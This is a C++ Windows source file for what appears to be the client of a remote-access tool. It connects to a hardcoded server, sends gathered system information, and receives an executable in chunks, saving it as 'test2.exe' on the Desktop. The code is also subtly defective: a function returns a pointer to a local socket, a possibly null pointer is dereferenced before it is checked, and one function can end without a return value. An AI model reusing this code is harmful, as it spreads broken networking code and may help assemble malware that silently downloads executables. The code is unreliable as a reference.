//
// Created by LUNAFE on 2022-02-10.
//

#include "file_handler.h"

file_handler::file_handler(char *task_id_, int final_index_) {
    memmove(task_id, task_id_, sizeof(task_id));
    final_index = final_index_;
}

int file_handler::AddData(char *file_data_, int index) {
    try {
#ifdef DEBUG
        wprintf(L"[DEBUG_TRANSFER] FILE_TASK_ID: %s\n[DEBUG_TRANSFER] INDEX: %d/%d\n", task_id, index, final_index);
#endif
        if (index == final_index) {
            memset(file_buffer, 0, sizeof(file_buffer));
            memmove(file_buffer, file_data_, sizeof(file_buffer));
            IssueFile();
#ifdef DEBUG
            wprintf(L"[DEBUG-TRANSFER] END_TRANSFER\n");
#endif
            return 0;
        } else {
            memset(file_buffer, 0, sizeof(file_buffer));
            memmove(file_buffer, file_data_, sizeof(file_buffer));
            IssueFile();
            return 1;
        }
    } catch (int ex) {
#ifdef DEBUG
        wprintf(L"[ERROR] %d\n", ex);
#endif
    }
}

void file_handler::IssueFile() {
    HANDLE write_handle;
    if (current_index == 1) {
        write_handle = CreateFileW(L"C:\\Users\\LUNAFE\\Desktop\\test2.exe", GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    } else {
        write_handle = CreateFileW(L"C:\\Users\\LUNAFE\\Desktop\\test2.exe", GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                                   FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (write_handle != INVALID_HANDLE_VALUE) {

        SetFilePointer(write_handle, stack, nullptr, FILE_BEGIN);
        DWORD written;
        WriteFile(write_handle, file_buffer, sizeof(file_buffer), &written, NULL);
#ifdef DEBUG
        wprintf(L"[DEBUG-TRANSFER] WRITTEN: %d\n", written);
#endif

        stack += written;
#ifdef DEBUG
        wprintf(L"[DEBUG-TRANSFER] STACK: %lu\n", stack);
#endif

        CloseHandle(write_handle);
    } else {
#ifdef DEBUG
        wprintf(L"[DEBUG-TRANSFER] ISSUE_FILE_ERROR\n");
#endif
    }
}

void util::MakeInfo(packet *packet_) {
    struct INFO init_info;
    util::InitRetrieveInfo(&init_info);

    packet_->set_type(PACKET_TYPE::INFO);

    char id[16];
    util::GenId(id, 16);
    packet_->set_task_id(id);

    packet_->set_data((char *) &init_info);

    packet_->set_current_index(0);
    packet_->set_final_index(0);
}

void MakeInitTransfer(packet *packet_) {
    packet_->set_type(PACKET_TYPE::FILE_SERVER_TO_CLIENT);

    char id[16];
    util::GenId(id, 16);
    packet_->set_task_id(id);

    packet_->set_current_index(0);
    packet_->set_final_index(0);
}

SOCKET *Connected() {
#ifdef DEBUG
    printf("[DEBUG_TRANSFER] TRY_CONNECT\n");
#endif
    WSADATA wsa_data;
    WSAStartup(MAKEWORD(2, 2), &wsa_data);

    SOCKET transfer_socket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (transfer_socket == -1) {
#ifdef DEBUG
        wprintf(L"[DEBUG_TRANSFER] SOCKET_ERROR\n");
#endif
        return nullptr;
    }

    SOCKADDR_IN in = {};
    in.sin_family = AF_INET;
    in.sin_port = htons(PORT);
    in.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(transfer_socket, (SOCKADDR *) &in, sizeof(in)) == SOCKET_ERROR) {
#ifdef DEBUG
        printf("[DEBUG_TRANSFER] SOCKET_ERROR\n");
#endif
        return nullptr;
    } else {
#ifdef DEBUG
        printf("[DEBUG_TRANSFER] SOCKET_GOOD\n");
#endif
        return &transfer_socket;
    }
}

void file_handler::NewFileTransfer() {
    SOCKET transfer_socket;
    memmove(&transfer_socket, Connected(), sizeof(transfer_socket));
    file_handler *handle;
    if (transfer_socket != NULL) {
        packet init_transfer;
        MakeInitTransfer(&init_transfer);
        if (init_transfer.Send(transfer_socket) == -1) {
#ifdef DEBUG
            wprintf(L"[DEBUG_TRANSFER] INIT_ERROR\n");
#endif
            return;
        } else {
#ifdef DEBUG
            wprintf(L"[DEBUG_TRANSFER] INIT_SUCCESS\n");
#endif
            while (true) {
                packet receive_packet;
                int result = receive_packet.Receive(transfer_socket);
                if (result == -1) {
#ifdef DEBUG
                    wprintf(L"[DEBUG_TRANSFER] RECEIVE_ERROR\n");
#endif
                    return;
                } else if (result == 2) {
#ifdef DEBUG
                    wprintf(L"[DEBUG_TRANSFER] DATA_RECEIVED\n");
#endif
                    wprintf(L"[CONTEXT] %S\n", receive_packet.get_data());
                    if (*receive_packet.get_current_index() == 1) {
                        handle = new file_handler(receive_packet.get_task_id(),
                                                  *receive_packet.get_final_index());
                        handle->current_index = 1;
                        if (handle->AddData(receive_packet.get_data(), *receive_packet.get_current_index()) == 0) {
#ifdef DEBUG
                            wprintf(L"[DEBUG_TRANSFER] END!\n");
#endif
                            return;
                        }
#ifdef DEBUG
                        wprintf(L"[DEBUG_TRANSFER] FIRST_RECEIVED\n");
#endif
                        handle->current_index++;
                    } else {
                        if (handle->AddData(receive_packet.get_data(), *receive_packet.get_current_index()) == 0) {
#ifdef DEBUG
                            wprintf(L"[DEBUG_TRANSFER] END!\n");
#endif
                            return;
                        }
                        handle->current_index++;
                    }
                } else {
#ifdef DEBUG
                    wprintf(L"[DEBUG_TRANSFER] WRONG_PACKET_TYPE\n");
#endif
                }
                //Sleep(1000);
            }
        }
    } else {
        return;
    }
}

void file_handler::ReceiveFileThread() {
    std::thread transfer_thread(NewFileTransfer);
    transfer_thread.detach();
}
